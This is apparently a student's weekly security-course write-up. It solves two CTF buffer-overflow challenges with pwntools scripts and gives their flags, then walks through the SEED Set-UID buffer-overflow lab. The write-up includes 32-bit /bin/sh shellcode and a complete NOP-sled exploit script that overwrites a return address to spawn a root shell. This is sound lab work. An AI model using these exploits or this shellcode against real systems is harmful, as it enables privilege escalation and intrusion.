# Trabalho Realizado na Semana 4

## CTF

### Desafio 1

After some time exploring the source code, we found some important information about this executable:

```
- The file mem.txt is opened, read and printed.
- The only way to change which file is read is by overiding the meme_file variable through the scanf function call.
- The scanf function reads 28 bytes to the buffer variable, which has only 20 bytes of space. The other 8 bytes and the ones corresponding to the meme_file variable.
```

We used the scanf function to make a buffer-overflow attack. The following python code was used to get the flag:

```py
#!/usr/bin/python3
from pwn import *

r = remote('ctf-fsi.fe.up.pt', 4003)

r.recvuntil(b":")
r.sendline(b"a" * 20 + b"flag.txt") # Send 20 "trash" bytes and then the value of the file we want to open
r.interactive()
```

Flag:
```
flag{c71a568e127be762a634e6f647175766}
```

### Desafio 2

This challenge had some differences when comparing to the first one:

```
- It has an extra variable val with size equal to 4 bytes
- There is an extra comparison to the val value, before opening the file
- It it aldo vulnerable to buffer overflow attack
```

This attack, even though it is different from the first one, it made in the same way since the `scanf` function scans for the extra 4 bytes of the `val` variable. That said, we just need to overide the `val` and the `meme_file` variables, the first one with `0xfefc2122` and the second with `flag.txt`. Since the variables are written in the stack bottom-up, the bytes of the `val` variable must be set in the reverse order. Using the following python script we can perform this attack and get the flag:

```py
from pwn import *

r = remote('ctf-fsi.fe.up.pt', 4000)
r.recvuntil(b":")
r.sendline(b"a" * 20 + b"\x22\x21\xfc\xfe" + b"flag.txt")
r.interactive()
```

Flag:
```
flag{1839859d5fe634c8e2af84c8321f6f54}
```

---

## Buffer Overflow Attack Lab (Set-UID Version)

### Task 1

Both of the binaries open a shell to run some code.

### Task 2

The program has a buffer overflow vulnerability. It first reads an input from a file called badfile,
and then passes this input to another buffer in the function bof(). The original input can have a maximum
length of 517 bytes, but the buffer in bof() is only BUF SIZE bytes long, which is less than 517. Because strcpy() does not check boundaries, buffer overflow will occur. Since this program is a root-owned
Set-UID program, if a normal user can exploit this buffer overflow vulnerability, the user might be able
to get a root shell. It should be noted that the program gets its input from a file called badfile. This
file is under users’ control. Now, our objective is to create the contents for badfile, such that when the
vulnerable program copies the contents into its buffer, a root shell can be spawned.

### Task 3

Running GDB on the debug binary, we got the following addresses:

```
gdb-peda$ p $ebp
$1 = (void *) 0xffffca78
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffca0c
```

Running GDB in stack-L1 binary we get the following addresses:

```
gdb-peda$ p $ebp
$1 = (void *) 0xffffcac8
```

After knowing this values, we needed to start to prepare the `badfile` which would be read by the binary. In order to make it, we started with the python base attack given in the lab called `exploit.py`. 

First of all, we needed to get the correct shellcode. After a closer look at the `Makefile`, we could see that the `stack-L1` was compiled with the `-m32` flag, which means that it was in 32 bit architecture. The correct shellcode to use in this architecture is the following:

```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
"\xd2\x31\xc0\xb0\x0b\xcd\x80"
```

After this, we needed to decide where in the buffer this shellcode would be. After some thinking, we found out that the best position for the shellcode would be at the end of the buffer. This is due to the fact that we would be filling the buffer with `NOP` instructions, which means that we just needed to land in one of the `NOP` to run our code. To make our chance of landing in one of them higher, the best ideia was to get the most `NOP` that we could possibly get, which could be done by pushing the shellcode to the end of the available buffer space. This position would then be `517 - len(shellcode)` since our buffer had length 517.

With the shellcode in the correct position of the buffer, there was one thing left to finish our attack, which was changing the function return address to one that we know that would run our code. For this we had two tasks:
1. Finding out which address should be used
2. Finding out where should this address be placed

The first part was quickly discovered with the help of the debug binary. After getting the values of the `ebp` and the `buffer`, we could quickly find the offset we should use to change the return address. The result of `ebp - buffer` gives us the offset that we needed to change the `ebp` value. We know that the `ebp` value is right before the return address value that we want to change and the architecture was 32 bit so the addresses are 4 bytes long, which means that in order to change the return address, we needed to give it an offset of `(ebp - buffer) + 4` which turned out to be `112`.

Having the position right, we just needed to put there some value. As we previously explained, if the address points to any `NOP` between the place where the address is and the shellcode, we are sure that the shellcode will run. We also know `ebp` value since we previously ran GDB with the binary and the addresses aren't randomized (randomization was turned off in the beginning of this lab). We used the value `0x88` ending up with the following python script:

```py
#!/usr/bin/python3
import sys

shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret    = 0xffffcac8 + 0x88
offset = 112

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

After running `exploit.py` and generating the `badfile`, we could successfully run our malicious code and open up a shell when running `stack.L1` binary.
